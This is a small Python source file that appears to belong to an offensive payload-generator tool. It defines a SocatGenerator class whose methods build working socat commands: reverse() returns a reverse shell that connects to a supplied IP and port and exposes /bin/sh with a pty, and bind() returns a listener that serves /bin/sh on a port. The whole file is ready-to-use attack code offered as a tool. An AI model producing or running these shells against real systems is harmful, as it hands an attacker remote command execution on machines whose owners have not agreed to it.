"""
Socat reverse and bind shell payload generators.

Author: Mostafa Tamime
"""

from generators.base import PayloadGenerator


class SocatGenerator(PayloadGenerator):
    """Standard socat reverse/bind shells."""

    def reverse(self, ip: str, port: int) -> str:
        return f"socat TCP:{ip}:{port} EXEC:/bin/sh,pty,stderr,setsid,sigint,sane"

    def bind(self, port: int) -> str:
        return (
            f"socat TCP-LISTEN:{port},reuseaddr,fork "
            f"EXEC:/bin/sh,pty,stderr,setsid,sigint,sane"
        )

    def file_extension(self) -> str:
        return ".sh"
